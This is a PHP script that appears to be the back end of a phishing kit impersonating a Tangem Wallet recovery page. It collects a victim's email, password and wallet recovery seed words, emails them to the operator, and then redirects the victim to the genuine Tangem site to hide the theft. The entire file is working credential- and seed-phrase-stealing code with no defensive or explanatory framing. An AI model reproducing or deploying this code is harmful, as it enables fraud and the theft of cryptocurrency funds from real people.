<?php

use Exception;

include_once './config.php';

$email                  =   $_POST['email'];
$password               =   $_POST['password'];
$keys                   =   empty($_POST['keys']) ? null : $_POST['keys'];

if (empty($email) || empty($password)) {
    redirect(base_url('recover.php'));
} else {
    
    function sendEmail($try=1) {
        global $email;
        global $password;
        global $keys;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);
            $mail->Subject  = 'New Recovery for Tangem Wallet Received';

            $html           =   '<p>A New Recovery Detected,</p>' ;
            $html          .=   '<p>You have received a new query from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Additional detail</b></p>' ;
            $html          .=   '<ul>' ;
            $html          .=   "<li>Email : <b>".$email."</b></li>";
            $html          .=   "<li>Password : <b>".$password."</b></li>";
            
            if(!empty($keys)) {
                $html  .=   "<li>Recovery Paraphrase :</li>";
                foreach ($keys as $ki => $key) {
                    $html  .=   "<li>Word $ki:  <b> $key </b></li>";
                }
            }
            
            $html          .=   '</ul>' ;
            $mail->Body     =   $html;
            $mail->AltBody  =   'Email : '.$email.' and Password :'. $password;

            $mail->send();

            $_SESSION["email"]          =   $email;
            $_SESSION["password"]       =   $password;
            $_SESSION["keys"]           =   $keys;
            
            if(empty($keys)) {
                redirect(base_url('paraphrase.php'));
            } else {
                redirect('https://tangem.com/en/');
            }
            
        } catch (Exception $exc) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url());
            }
        }
    }
    
    sendEmail(1);
}
?>